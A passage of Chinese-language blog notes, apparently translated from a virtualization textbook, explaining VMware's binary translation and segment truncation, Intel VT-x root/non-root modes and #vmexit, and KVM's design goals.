[153]机器模拟器的经验表明，使用诸如在用户级程序中运行的动态二进制翻译（DBT）等技术，可以将完全仿真的开销限制在5倍的减速。虽然对于机器模拟环境来说速度很快，但显然不足以满足我们的性能要求。</p><p>VMware解决这个问题的方法结合了两个关键见解。首先，虽然直接执行无法用于虚拟化整个x86体系结构，但它实际上可以在大多数情况下使用，特别是用于运行应用程序。第二个关键见解是通过正确配置硬件，特别是通过谨慎使用x86分段保护机制，可以使动态二进制翻译下的系统代码也能以接近本机速度运行；这将在§3.2.3下面讨论。</p><p><img src="https://img.gls.show/img/20230904124838.png"></p><p>图3.1显示了动态确定是否可以使用直接执行还是必须使用动态二进制翻译的实际算法。该算法依赖于虚拟机的一些特定寄存器的状态，并导致以下决策：</p><ul><li>（行＃1-＃3）：只有在保护模式和v8086模式下才会设置％cr0.pe。当虚拟机处于实模式或系统管理模式时，需要使用DBT。例如，BIOS在实模式下运行；</li><li>（行＃4-＃6）：x86 v8086模式始终可以直接使用DE来虚拟化v8086模式下的客户，例如，在Windows 95中运行MS-DOS仿真 [111]；</li><li>（行＃7-＃9）：每当虚拟机可以控制中断标志时，都需要使用DBT。这个并集包括了当客户在内核模式执行（cpl=0）时的常见情况，但也包括了用户级进程可以通过禁用中断来建立关键区域的罕见情况（例如，在Linux上使用iopl(2)系统调用）；</li><li>（行＃10-14）：每当无法从内存中恢复六个段描述符寄存器中的任何一个的隐藏内容时，都需要使用DBT。这是一个有点隐晦的边缘情况，必须处理才能正确运行Windows 95；</li><li>在其余情况下可以使用DE，特别是在无法禁用中断时可以在用户级别使用。</li></ul><p>如果我们排除这些边缘情况，算法使VMware VMM使用DBT来执行客户操作系统，使用DE来运行应用程序。这是一个好消息，因为内核代码的数量是有限的，并且大多数应用程序在用户级别花费了大部分执行时间。</p><p>这个算法有两个有趣的特性：（i）它不对未来可能执行的客户指令做任何假设，而是以O.1/的速度执行；（ii）通过谨慎编码虚拟处理器状态，可以用少数汇编指令来实现。</p><p>正式考虑：Popek和Goldberg在他们的混合虚拟机中讨论了类似的情况（参见§2.3和第3定理[143]），适用于所有用户敏感指令都是特权的体系结构。x86-32体系结构几乎属于这一类别：sgdt、sidt、sldt和smsw是唯一的非特权、用户敏感指令。幸运的是，即使是Intel的手册也将它们描述为可用但对应用程序没有用处 [102]。此外，用于隔离VMware VMM的段截断通过lsl指令可见于应用程序。VMware Workstation使用直接执行违反了等效性要求，但除了提供一种确定应用程序是否在虚拟化环境中运行的简便方法外，几乎没有实际后果。</p><h3 id="3-2-3-VMWare-VMM-及其二进制翻译器"><a href="#3-2-3-VMWare-VMM-及其二进制翻译器" class="headerlink" title="3.2.3 VMWare VMM 及其二进制翻译器"></a>3.2.3 VMWare VMM 及其二进制翻译器</h3><blockquote><p>VMware VMM通过巧妙地结合直接执行和动态二进制翻译技术，并利用分段和基于页的保护机制，实现了对x86架构的高效虚拟化。</p></blockquote><p>虚拟机监控程序（VMM）的主要功能是虚拟化CPU和主内存。在其核心，VMware VMM将直接执行子系统与动态二进制翻译器结合在一起。简单来说，直接执行用于运行客户应用程序，而动态二进制翻译器用于运行客户操作系统。</p><p>动态二进制翻译（DBT）[84]是一种高效的仿真形式。DBT不是逐个解释指令，而是将一组指令编译成一个可执行代码片段，通常是一个基本块。代码存储在称为翻译缓存的大缓冲区中，以便可以多次重复使用。DBT具有一些众所周知的优化，例如链接，允许在编译的片段之间直接跳转[53]。VMware依赖于DBT，以便处理器不是执行或解释原始虚拟机指令，而是本地执行翻译缓存中相应的已翻译序列。</p><p>DBT的性能，特别是系统级DBT的性能，对硬件配置非常敏感。例如，Embra [184]由于MMU仿真的成本而减速了5倍。通常，DBT系统也在与它们模拟的软件相同的地址空间中运行。对于VMware来说，挑战在于确保VMware VMM可以与虚拟机安全共享一个地址空间，而且对虚拟机不可见，并且执行时的性能开销最小。鉴于x86架构支持基于分段和分页的保护机制，解决方案可以使用其中一个或两个机制。例如，使用平坦内存模型的操作系统只依赖于分页（而不是分段）来保护自己免受应用程序的影响。</p><p>VMware VMM只使用分段来进行保护。线性地址空间被静态划分为两个区域，一个用于虚拟机，一个用于VMM。虚拟机段由VMM截断，以确保它们不与VMM本身重叠。</p><p>图3.2说明了VMware使用段截断的方式，以一个采用平坦内存模型的客户操作系统为例。在%cpl=3运行的应用程序使用截断的段，而且还受到其自身操作系统的限制，以阻止它们使用页面保护来访问客户操作系统区域。</p><p>在通过二进制翻译运行客户内核代码时，硬件CPU位于%cpl=1。二进制翻译引入了一个新的特定挑战，因为已翻译的代码包含了各种指令。有些指令需要访问VMM区域（以访问支持VMM数据结构），而其他指令需要访问线性地址空间的虚拟机部分。解决方案是依赖于硬件保护，而不是运行时内存检查。具体来说，VMware VMM保留一个段寄存器%gs，始终指向VMM区域：由翻译器生成的指令使用<code>&lt;gs&gt;</code>前缀来访问VMM区域，并且二进制翻译器在翻译时保证，不会有虚拟机指令直接使用<code>&lt;gs&gt;</code>前缀。相反，已翻译的代码对于原始具有<code>&lt;fs</code>&gt;或<code>&lt;gs&gt;</code>前缀的虚拟机指令使用%fs。其余的三个段（%ss，%ds，%es）可以由虚拟机指令直接使用（在它们的截断版本中）。</p><p>当然，虚拟机指令可能有合法的，甚至是频繁的，原因要使用靠近线性地址空间顶部的地址，那里实际上是VMM所在的地方。正如预期的那样，段截断会为每个这样的引用触发通用保护故障，这可以由VMM来模拟。为了减少这种陷阱的数量，VMware Workstation依赖于自适应二进制翻译作为一种优化，以在运行时消除大多数通用保护故障。自适应二进制翻译是基于这样一个观念的，即客户内核中的相同几个位置几乎导致了所有这些通用保护故障。它会重新翻译基本块，并将原始引起故障的指令（引起陷阱的指令）替换为安全模拟内存访问而不引发陷阱的特定序列。</p><p>图3.2还说明了基于页的保护（pte.us）的作用。虽然没有用于保护VMM免受虚拟机的保护，但用于保护客户操作系统免受其应用程序的保护。解决方案很简单：实际页表中的pte.us标志与原始客户页表中的标志相同。在%cpl=3运行的客户应用程序代码受到硬件的限制，只能访问pte.us=1的页面。在%cpl=1下通过二进制翻译运行的客户内核代码不受此限制。</p><p><img src="https://img.gls.show/img/20230904150931.png"></p><blockquote><p>使用段截断来保护 VMware VMM [45]。在这个例子中，虚拟机的操作系统是为平面内存模型设计的。应用程序在用户级直接执行(cpl = 3)。 客户操作系统内核在转换缓存(TC)中的二进制转换下运行，cpl = 1</p></blockquote><p>在通过二进制翻译运行客户内核代码时，硬件CPU处于%cpl=1。由于已翻译的代码包含了多种指令，其中一些需要访问VMM区域（以访问支持VMM数据结构），而其他一些需要访问线性地址空间中虚拟机的部分。</p><p>解决方案是依赖硬件保护机制，而不是运行时内存检查。具体来说，VMware VMM保留一个段寄存器%gs，始终指向VMM区域：由翻译器生成的指令使用<code>&lt;gs&gt;</code>前缀来访问VMM区域，并且二进制翻译器在翻译时保证，不会有虚拟机指令直接使用<code>&lt;gs&gt;</code>前缀。相反，已翻译的代码对于原始具有<code>&lt;fs&gt;</code>或<code>&lt;gs&gt;</code>前缀的虚拟机指令使用%fs。其余的三个段（%ss，%ds，%es）可以由虚拟机指令直接使用（在它们的截断版本中）。</p><p>然而，虚拟机指令可能会有合法的、甚至是频繁的理由，要使用接近线性地址空间顶部的地址，而实际上VMM位于那里。正如预期的那样，段截断会为每个这种引用触发通用保护故障，这可以由VMM来模拟。为了减少这种陷阱的数量，VMware Workstation依赖于自适应二进制翻译作为一种优化，以在运行时消除大多数通用保护故障。自适应二进制翻译的基本观念是，客户内核中的相同几个位置几乎导致了所有这些通用保护故障。它会重新翻译基本块，并将原始引起故障的指令（引起陷阱的指令）替换为安全模拟内存访问的特定序列，从而减少陷阱的触发。这有助于提高性能并减少运行时的开销。</p><p>图3.2还说明了基于页面的保护（pte.us）的作用。尽管不用于保护VMM免受虚拟机的影响，但它<strong>用于保护客户操作系统免受其应用程序的影响</strong>。解决方案很简单：实际页表中的pte.us标志与原始客户页表中的标志相同。在%cpl=3下运行的客户应用程序代码受到硬件的限制，只能访问pte.us=1的页面。在%cpl=1下通过二进制翻译运行的客户内核代码不受此限制。这种方式有助于确保客户操作系统受到保护免受其应用程序的恶意影响。</p><h3 id="3-2-4主机操作系统的作用"><a href="#3-2-4主机操作系统的作用" class="headerlink" title="3.2.4主机操作系统的作用"></a>3.2.4主机操作系统的作用</h3><p>VMware Workstation是一种类型-2的虚拟机监控程序，表面上运行在像Linux或Windows这样的主机操作系统之上，但实际上虚拟机监控程序，特别是VMware VMM，在执行虚拟机时完全控制CPU。</p><p>图3.3展示了VMware Workstation的托管架构，它由三个组件组成：(i) 一个用户级程序（VMX），负责与最终用户和主机操作系统的所有交互，特别是用于I/O仿真的目的；(ii) 安装在内核中的小型设备驱动程序（VMM驱动程序）；和(iii) VMware VMM，它在与主机操作系统相同的级别上运行，但在一个不连贯的环境中运行，其中主机操作系统已被暂时挂起并从虚拟内存中删除。</p><p>//todo</p><h2 id="3-6-FURTHER-READING"><a href="#3-6-FURTHER-READING" class="headerlink" title="3.6 FURTHER READING"></a>3.6 FURTHER READING</h2><p>原始的VMware Workstation虚拟化监控程序已在[45]中详细描述。其他论文则描述了VMware Workstation的关键方面，包括其I/O和网络性能[162]以及GPU的虚拟化[66]。自它们首次引入以来，VMware Workstation已经成熟，并成功地过渡到利用VT-x和AMD-v等新兴架构支持虚拟化的能力。</p><p>Agesen等人描述了VMware在虚拟化方面的演进过程（请参阅[4]）。</p><p>类似地，Pratt等人描述了Xen的演进过程，特别是从使用硬件支持的半虚拟化到全虚拟化的过渡（在具有硬件支持的机器上）[146]。Chisnal于2007年编写的书籍《Xen Hypervisor的权威指南》提供了对Xen内部的详细描述，包括在采用硬件虚拟化之前和之后的情况[50]。</p><p>VMware ESX Server（现在称为vSphere）是一种商用的类型-1虚拟化监控程序。它与VMware Workstation共享相同的VMware VMM子系统，但作为类型-1虚拟化监控程序的一部分，直接调度I/O、CPU和内存资源[7, 82, 177]，并且可以实现虚拟机的实时迁移[135]。我们特别推荐Waldspurger关于ESX内存管理的描述[177]，这篇文章获得了ACM SIGOPS Hall of Fame奖项[2]。</p><p>KVM for ARM在[59]中有更详细的描述，而VMware的MVP在[28]中有描述。</p><p>曾经有一个放弃的Xen for ARM移植[91]需要对客户内核进行全面修改，但从未完全开发完成。这些半虚拟化方法都不能运行未经修改的客户操作系统。这些方法已被利用ARM硬件虚拟化支持的解决方案所取代，首次引入于ARMv7，将在第7章中讨论。</p><h1 id="四-X86-64-使用-VT-x-的-CPU-虚拟化"><a href="#四-X86-64-使用-VT-x-的-CPU-虚拟化" class="headerlink" title="四 X86-64: 使用 VT-x 的 CPU 虚拟化"></a>四 X86-64: 使用 VT-x 的 CPU 虚拟化</h1><p>现在，我们将在三个章节中依次描述x86-64处理器中用于虚拟化的体系结构支持。这种体系结构支持是CPU（第4章）、MMU（第5章）和I/O子系统（第6章）创新的组合。本章描述了VT-x，即英特尔技术，用于虚拟化CPU本身。第4.1节首先描述了英特尔工程师在设计VT-x时提出的关键要求。第4.2节描述了CPU虚拟化的方法、根模式和非根模式的概念，以及体系结构与Popek和Goldberg定理的关系。第4.3节以KVM（Linux内核虚拟机）作为案例研究，介绍了如何构建一个专门设计为假定硬件支持虚拟化的虚拟机监控程序。第4.4节讨论了CPU虚拟化的性能影响，特别是在不同模式之间的原子转换的实现成本。最后，与所有章节一样，我们提供了进一步阅读的指引。</p><h2 id="4-1设计规定"><a href="#4-1设计规定" class="headerlink" title="4.1设计规定"></a>4.1设计规定</h2><p>intel虚拟化技术，一般称为 VT-x [171] ，于2005年推出，主要目标是为虚拟化提供架构支持。</p><blockquote><p>英特尔虚拟化技术的一个核心设计目标是消除对CPU半虚拟化和二进制翻译技术的需求，从而实现可以支持各种未经修改的客户操作系统的VMM的实现，同时保持高水平的性能。—R. Uhlig等人，IEEE Computer ，2005年 [171]</p></blockquote><p>在提出这个目标时，英特尔的工程师观察到，使用诸如半虚拟化和动态二进制翻译等现有技术在虚拟化现有x86架构方面面临一些严峻的技术挑战。Uhlig等人[171]列出了以下对使用软件技术的方法的具体挑战。</p><ol><li>环别名和压缩：设计为在%cpl=0下运行的客户内核代码必须使用其余的三个特权级来确保隔离。这会创建一个别名，因为至少有两个不同的客户特权级必须使用相同的实际特权级。然而，根据架构的规范，运行在这两个特权级中的软件必须相互保护。</li><li>地址空间压缩：VMM必须位于线性地址空间的某个部分，而客户软件不能访问或使用该部分。</li><li>对特权状态的非故障访问：一些臭名昭著的Pentium 17 [151]指令提供对特权状态的只读访问，并且是行为敏感的，例如中断描述符表（sidt），全局描述符表（sgdt）等的线性内存位置。这些结构由VMM控制，位置与客户操作系统指定的位置不同。</li><li>客户转换的不必要影响：为了满足效率标准，关键是敏感指令（必须触发转换的指令）在实际中很少出现。不幸的是，现代操作系统广泛依赖于特权级敏感的指令，例如在关键区域内暂停中断，或在内核和用户模式之间进行转换。理想情况下，这些指令不应对虚拟化敏感。</li><li>中断虚拟化：中断标志的状态（%eflags.if）对非特权指令（pushf）可见。由于当客户正在运行时无法清除该标志，因为这会违反安全性，因此客户直接使用该指令将导致不正确的行为。此外，popf指令是控制敏感的，因为其语义取决于CPU是否可以控制中断（即%cpl ≤ %eflags.iopl）。</li><li>访问隐藏状态：x86-32架构包含一些“隐藏”状态，最初从内存加载，但如果内存中的内容发生更改，则无法由软件访问。例如，32位段寄存器是隐藏的：它们从内存加载到处理器中，但不能从处理器重新加载到通用寄存器或内存中。只要内存内容不发生更改，就可以将段寄存器重新加载到处理器中，例如，在由虚拟化引起的陷阱后和对客户操作系统进行隐藏后。然而，一些旧操作系统，尤其是Windows 95，在某些关键区域修改段描述符表的内容，但明确依赖于这些非常特定的x86-32语义。</li></ol><p>当然，第3章中描述的系统的证据表明，这些挑战在实践中可以得到缓解，但无法完全消除。例如，地址空间压缩挑战会在虚拟机使用线性内存顶部时影响性能：一些客户操作系统可能会因此表现非常差。更令人担忧的是，一些“臭名昭著”的“Pentium 17”指令始终会向在用户级别运行的应用程序返回不正确的结果，这是对等性的限制。</p><p>在设计VT-x时，英特尔的核心设计目标是完全满足Popek和Goldberg定理的要求，明确的目标是运行在基于VT-x的虚拟化程序之上的虚拟机满足等效性、安全性和性能这三个核心属性。</p><ol><li>等效性（Equivalence）：英特尔的架构师们设计了VT-x，以在虚拟化硬件和基础硬件之间提供绝对的架构兼容性，而且还要向后兼容传统的x86-32和x86-64 ISA。这比VMware Workstation更为雄心勃勃，后者着眼于一组明确定义的客户操作系统，并且半虚拟化方法如Xen，它需要内核修改，并且实际上只适用于开源操作系统。</li><li>安全性（Safety）：基于动态二进制翻译或半虚拟化的先前虚拟化程序通过需要在软件中维护复杂的不变量的推理来提供安全性和隔离性，例如正确使用分段进行保护。通过专门为虚拟化设计的体系结构支持，一个大大简化的虚拟机监视程序可以提供相同的特性，但代码规模要小得多。这减少了虚拟机监视程序的潜在攻击面和软件漏洞的风险。</li><li>性能（Performance）：具有讽刺意味的是，性能比现有的最先进的虚拟化技术更高并不是第一代硬件虚拟化支持的发布目标。相反，在开始阶段的目标仅仅是建立适当的体系结构和在体系结构和微体系结构级别进行持续改进的路线图。事实上，第一代具有硬件虚拟化支持的处理器在性能上与使用DBT的最先进的解决方案不竞争。</li></ol><h2 id="4-2-VT-X-架构"><a href="#4-2-VT-X-架构" class="headerlink" title="4.2 VT-X 架构"></a>4.2 VT-X 架构</h2><p>VT-x架构的核心设计决策是不改变ISA（指令集架构）中各个指令的语义。这当然包括那些最明显违反虚拟化原则的指令。作为一个推论，该架构也不试图单独解决限制虚拟化的架构的各个方面，如第4.1节所述。相反，VT-x复制了处理器的整个架构可见状态，并引入了一种新的执行模式：根模式（root mode）。Hypervisors（虚拟机监视程序）和主机操作系统在根模式下运行，而虚拟机在非根模式下执行。这个架构扩展具有以下属性：</p><ul><li>处理器在任何时间点都处于根模式或非根模式中的一种。状态转换是原子的，意味着单个指令或陷阱可以从一种模式切换到另一种模式。这与操作系统执行上下文切换的传统实现方式不同，后者需要一个复杂的指令序列。</li><li>新模式（根模式与非根模式）仅用于虚拟化。它与处理器的所有其他执行模式（例如，实模式、v8086模式、保护模式）正交，这些模式在两种模式下都可用。它也与保护模式的保护级别（例如%cpl=0–%cpl=3）正交，每种模式分别适用于每种模式。</li><li>每种模式定义了自己独立的完整64位线性地址空间。每个地址空间由独立的页表树定义，具有独立的页表寄存器。只有与当前模式对应的地址空间在TLB中处于活动状态，并且TLB在状态转换的一部分中以原子方式更改。</li><li>每种模式都有自己的中断标志。特别是在非根模式下，软件可以自由地操作中断标志（%eflags.if）。外部中断通常在根模式下传递，并在必要时触发从非根模式到根模式的转换。即使在非根中断被禁用时，状态转换仍会发生。</li></ul><p>图4.1说明了VT-x的核心设计如何由系统软件使用：在根模式下，软件可以访问x86-64的完整（非虚拟化）架构，包括受保护模式的所有特权环（在图中显示）以及执行的传统模式（未显示）。这提供了架构的向后兼容性，因此对于软件来说，主机操作系统通常在根-%cpl=0中运行，其应用程序将在根-%cpl=3中运行。虚拟机监视程序也在根-%cpl=0中运行，在那里它可以发出新的特权指令以进入非根模式。图4.1还显示，虚拟机使用特权环的完整副本执行：每个客户操作系统在非根-%cpl=0中运行，应用程序在非根-%cpl=3中运行。</p><p><img src="https://img.gls.show/img/20230904155559.png"></p><h3 id="4-2-1-VT-X-和-POPEK-GOLDBERG-定理"><a href="#4-2-1-VT-X-和-POPEK-GOLDBERG-定理" class="headerlink" title="4.2.1 VT-X 和 POPEK/GOLDBERG 定理"></a>4.2.1 VT-X 和 POPEK/GOLDBERG 定理</h3><p>回想一下2.2中讨论的 Popek 和 Goldberg 的中心虚拟化定理。</p><blockquote><p>..定理1[143] : 对于任何传统的第三代计算机，如果该计算机的敏感指令集是特权指令集的子集，则可以构造虚拟机监视器。</p></blockquote><p>VT-x架构满足了Popek和Goldberg的定理的标准，但通过与最初用于证明该定理的原始模型相比，进行了重大的改进。Popek和Goldberg确定了虚拟化的关键标准。通过他们的定理构建证明，他们进一步证明了虚拟化可以在不需要任何额外的硬件约束的情况下实现，只需支持受保护操作系统所需的那些约束，特别是使用地址空间压缩和环别名（在用户级别同时运行客户操作系统和应用程序）来构建虚拟机监视程序。</p><p>而英特尔采取了一种不同的实用路径，通过复制处理器的整个状态并引入专用的根模式。特别是，对架构的完全复制是为了确保ISA的向后兼容性和虚拟化工作负载的完全等效性而进行的[171]。因此，必须重新定义术语，以确凿地表达VT-x遵循Popek/Goldberg标准。相应的核心VT-x设计原则可以非正式地表述如下。</p><blockquote><p>在具有根模式和非根模式执行以及处理器状态的完全副本的体系结构中，如果所有敏感指令（根据非可虚拟化的传统体系结构）都具有根模式特权，则可以构建虚拟机监视程序。<br>在非根模式下执行时，所有具有根模式特权的指令都是（i）由处理器实现的，要求它们仅对处理器的非根副本执行操作，或者（ii）引发陷阱。</p></blockquote><p>我们可以做三个观察。</p><ol><li>与最初的Popek和Goldberg定理不同，这个重新表述不考虑指令是否具有特权（根据它们对在%cpl&gt;0运行的软件的可用性定义），而只考虑它们是否具有根模式特权的问题。</li><li>这些陷阱足以满足等效性和安全性的标准。这与最初的定理类似。</li><li>但是，通过在硬件中实现某些敏感指令以减少转换是满足虚拟化的性能标准所必需的。</li></ol><p>举几个例子可以帮助说明灵敏度的概念与（常规的）特权的概念是相互独立的。首先，以非根-%cpl=0运行的客户操作系统将发出某些特权指令，例如读取或甚至写入控制寄存器：这些指令必须在处理器状态的非根副本上运行。根据原则，在这种情况下有两种可能的实现方式：（i）要么在硬件中在非根上下文中执行指令，因为整个处理器状态都是复制的。虚拟机监视程序不应被通知，因为硬件完全处理这些指令；（ii）或者从非根模式引发陷阱，允许虚拟机监视程序模拟指令。从性能的角度来看，前者更可取，因为它减少了转换的次数。显然，这需要处理器的特定架构支持。因此，实施决策是硬件复杂性和总体性能之间的权衡。</p><p>作为第二个例子，操纵中断标志的指令（cli、sti、popf）是敏感的，特别是因为其他指令实际上可以将关于中断标志本身的信息泄漏到内存中（pushf）。然而，请记住，这四个指令在体系结构中不是特权指令，也就是说，在某些情况下，它们对用户级应用程序是可用的。鉴于它们在现代内核中的高执行率，它们的非根实现是由处理器直接处理的。</p><p>作为第三个例子，一些在用户级可用的指令，如sgdt和sidt，是已知的行为敏感指令。这些罕见的指令虽然不具备特权，但对虚拟化敏感。因此，它们必须具有（并且确实如此）根模式特权。</p><h3 id="4-2-2根模式和非根模式之间的转换"><a href="#4-2-2根模式和非根模式之间的转换" class="headerlink" title="4.2.2根模式和非根模式之间的转换"></a>4.2.2根模式和非根模式之间的转换</h3><p><img src="https://img.gls.show/img/20230904161040.png"></p><p>图4.2展示了VT-x实现中根模式和非根模式之间的主要交互和转换。虚拟机的状态存储在物理内存中的一个专用结构中，称为虚拟机控制结构（Virtual Machine Control Structure，VMCS）。一旦初始化，虚拟机通过vm resume指令恢复执行。这个特权指令将状态从内存中的VMCS加载到寄存器文件中，并在主机环境和客户环境之间执行原子转换。然后，虚拟机在非根模式下执行，直到必须由虚拟机监视程序处理的第一个陷阱或下一个外部中断。从非根模式到根模式的这种转换称为#vmexit。</p><p>表4.1列出了#vmexit的各种可能原因。原因本身存储在一个专用寄存器（vmcs.exit_reason）中，以加速模拟。导致<strong>退出的原因</strong>可以分为以下几类。</p><p>• 客户尝试执行根模式特权指令，因为这是Popek和Goldberg定理的基本要求。这包括大多数经典（即非可虚拟化）x86架构的特权指令，以及导致定理违规的敏感但非特权的指令。</p><p>• 新的vm call指令，旨在允许非根模式和根模式之间的显式转换，特别是由客户操作系统发出并发送到虚拟机监视程序的超级调用。这类似于sys enter指令，用于在用户模式和内核模式之间进行转换。</p><p>• 异常是由非根模式下执行的任何无害指令引发的，偶然触发陷阱的情况。这包括特别是由于阴影分页、访问内存映射的I/O设备或由于段违规而引发的页面故障（#PF）或一般性故障（#GP）。</p><p>• 当扩展页面映射（由虚拟机监视程序控制）无效时，导致的页面故障的子集称为EPT违规。这个退出是在引入扩展分页（参见第5章）时引入的。</p><p>• 当CPU在非根模式下执行时发生的外部中断，例如由主机上的网络或磁盘I/O引发的中断。这些事件必须由虚拟机监视程序（对于类型1设计）或主机操作系统（对于类型2设计）处理，可能对虚拟机本身具有或不具有任何副作用。</p><p>中断窗口在虚拟机启用中断并且虚拟机有未处理中断时打开。在#vmexit之后，虚拟机监视程序可以将未处理的中断模拟到虚拟机上。</p><p>最后，VT-x引入的用于支持虚拟化的ISA扩展也是受控敏感的，因此会导致#vmexit，每个#vmexit都有不同的退出原因。这种退出在“正常虚拟化”期间永远不会发生，但在嵌套虚拟化中起着基础作用。</p><p><img src="https://img.gls.show/img/20230904190642.png"></p><p>根模式和非根模式之间的转换在体系结构上是原子的：一个单一指令——vmresume——将转换回非根模式并将VMCS状态加载到当前处理器状态中。在另一个方向上，陷阱#vmexit将虚拟CPU的状态存储到VMCS状态中。虽然VMCS状态由特定的内存区域支持，但体系结构没有规定处理器必须将整个状态溢出到缓存的内存中，还是可以将其推迟到处理器本身的子集中。因此，当前VMCS的内存状态是未确定的。此外，VMCS的布局未定义。虚拟机监视程序软件必须通过vmread和vmwrite指令对客户状态的选定部分进行访问。</p><h3 id="4-2-3一个警示性的故事ーー虚拟化中央处理器与无视-MMU"><a href="#4-2-3一个警示性的故事ーー虚拟化中央处理器与无视-MMU" class="headerlink" title="4.2.3一个警示性的故事ーー虚拟化中央处理器与无视 MMU"></a>4.2.3一个警示性的故事ーー虚拟化中央处理器与无视 MMU</h3><p>今天，所有支持虚拟化的处理器架构也都虚拟化了内存管理单元（MMU）。然而，这并不总是这样。事实上，第一代带有VT-x的英特尔CPU仅提供了有关内存虚拟化的基本支持。在这样的设计中，根模式和非根模式分别具有一个不同的%cr3寄存器，指定页表树的基址。%cr3寄存器会在vm entry和#vm exit之间的根模式和非根模式之间的过渡中原子更新。因此，虚拟机监视程序可以配置100%不重叠的地址空间。这解决了先前虚拟机监视程序的地址压缩问题，并消除了依赖分段来保护虚拟机监视程序的需要。但在这种最小化的设计中，内存虚拟化的其他方面都留给了软件。与之前没有任何架构支持的架构一样，仍然有两种方法可行：（1）用包含宿主物理值的重复页表集合来阴影虚拟机的页表（使用虚拟客户物理值）——这是VMware所做的（见§3.2.5）；或者（2）依赖虚拟内存子系统的半虚拟化，并通知虚拟机监视程序验证所有新映射（见§3.3）。当阴影页表时，这个选择产生了严重而意想不到的后果。使用阴影分页，英特尔处理器的前两代未能解决性能标准：超过90%的#vmexit过渡是由于阴影分页和由此产生的虚拟机性能较慢，比简单地禁用VT-x并使用软件技术时要慢[3]。这种异常的解释实际上是微妙的：阴影操作通过保持硬件页表的映射与由客户操作系统在其自己的页表中所做的更改同步来进行。识别更改的机制是MMU本身：所有客户页表页都被降级为只读映射，以确保从虚拟机到虚拟机监视程序的过渡，即在经典架构中的陷阱和在VT-x中的#vmexit。因此，完全依赖直接执行的虚拟机监视程序必然会因虚拟机客户操作系统的虚拟内存更改而遭受陷阱。相比之下，VMware的内存跟踪机制依赖于自适应二进制翻译，以消除绝大多数页面故障。自适应动态二进制翻译是一种有效的技术，因为它依赖于操纵页表项的指令的高局部性，每个操作系统大约有一打这样的指令。一旦动态识别了这些指令位置，自适应的重新翻译过程就简单地模拟这些指令并更新阴影条目，而不会直接引用内存位置，因此不会引发昂贵的陷阱。 幸运的是，这个异常在随后的处理器中得到了解决。</p><h2 id="4-3-KVM-ーー-VT-X-的hypervisor"><a href="#4-3-KVM-ーー-VT-X-的hypervisor" class="headerlink" title="4.3 KVM ーー VT-X 的hypervisor"></a>4.3 KVM ーー VT-X 的hypervisor</h2><p>到目前为止，我们已经描述了 VT-x 引入的硬件扩展，并讨论了一些体系结构方面的注意事项。我们现在使用基于 Linux 的内核虚拟机 KVM [113]作为实践创新的案例研究。KVM 因其成熟性和简单性而成为一个有趣的研究对象。</p><p>KVM是最重要的开源类型-2虚拟化监视器之一。它在众多项目、云托管解决方案中得到应用，并广泛部署在企业和私有云中。KVM是主要商业Linux发行版官方支持的虚拟机监视器，也是大多数OpenStack部署的基础。</p><ul><li>KVM依赖于独立的开源项目QEMU来模拟I/O。在没有KVM的情况下，QEMU是一个完整的机器模拟器，支持对CPU的跨架构二进制翻译，以及完整的I/O设备模型。与KVM一起，它们组成了类型-2虚拟机监视器，其中QEMU负责处理所有I/O前端设备模拟，Linux主机负责I/O后端（通过正常系统调用），而KVM内核模块负责复用处理器和内存管理单元（MMU）。</li><li>KVM的内核组件实现了CPU和内存虚拟化的功能，相当于VMware虚拟机监视器（VMM）。这些组件已内置到Linux内核中，旨在避免与Linux产生不必要的冗余。KVM从一开始就被设计为Linux的一部分，明确的目标是将所有内核驻留组件合并到Linux主线源代码树中。这一目标于2007年的Linux版本2.6.20中实现。</li><li>与Xen或VMware Workstation不同，KVM从一开始就假设存在硬件支持虚拟化的情况下进行设计。这意味着它充分利用了硬件虚拟化支持，如Intel的VT-x。这使得KVM成为研究基于VT-x设计的虚拟化监视器内在复杂性的一个特别好的案例。</li></ul><p>综上所述，KVM是一个备受推崇的开源虚拟机监视器，广泛应用于各种项目，包括云托管和企业环境。它依赖于QEMU来提供I/O模拟，并与Linux内核深度集成，充分利用硬件虚拟化支持，成为主要Linux发行版的官方支持虚拟机监视器。</p><h3 id="4-3-1-充分利用-VT-X-的挑战"><a href="#4-3-1-充分利用-VT-X-的挑战" class="headerlink" title="4.3.1 充分利用 VT-X 的挑战"></a>4.3.1 充分利用 VT-X 的挑战</h3><p>KVM的开发人员根据Popek和Goldberg的虚拟机三个核心属性进行了如下调整：</p><p>等价性：KVM虚拟机应能够运行任何x86操作系统（32位或64位）及其所有应用程序，无需任何修改。KVM必须在硬件级别提供足够的兼容性，以便用户可以选择他们的客户操作系统内核和发行版。</p><p>安全性：KVM虚拟化虚拟机可见的所有资源，包括CPU、物理内存、I/O总线和设备以及BIOS固件。即使在存在恶意或故障的客户操作系统的情况下，KVM hypervisor始终完全控制虚拟机。</p><p>性能：KVM应具有足够的速度来运行生产工作负载。然而，KVM明确设计为类型-2架构，这意味着资源管理和调度决策作为主机Linux内核的一部分（其中KVM内核模块是其中的一部分）而保留。</p><p>为实现这些目标，KVM的设计进行了仔细的权衡，以确保所有性能关键组件都在KVM内核模块内处理，同时限制了该内核模块的复杂性。具体来说，KVM内核模块仅处理与x86处理器的仿真、内存管理单元（MMU）、中断子系统（包括APIC、IOAPIC等）的仿真相关的核心平台功能；所有负责I/O仿真的功能都在用户空间处理。</p><p>为了进一步简化实现，KVM的原始版本高度利用了两个现有的开源项目：（i）QEMU用于用户空间中的所有I/O仿真，以及（ii）Xen的x86特定部分，它作为Linux内核模块的起点。此后，KVM和Xen基本上走上了不同的道路，但QEMU的演进主要受到对KVM的要求驱动。</p><h3 id="4-3-2-THE-KVM-KERNEL-MODULE"><a href="#4-3-2-THE-KVM-KERNEL-MODULE" class="headerlink" title="4.3.2 THE KVM KERNEL MODULE"></a>4.3.2 THE KVM KERNEL MODULE</h3><p><img 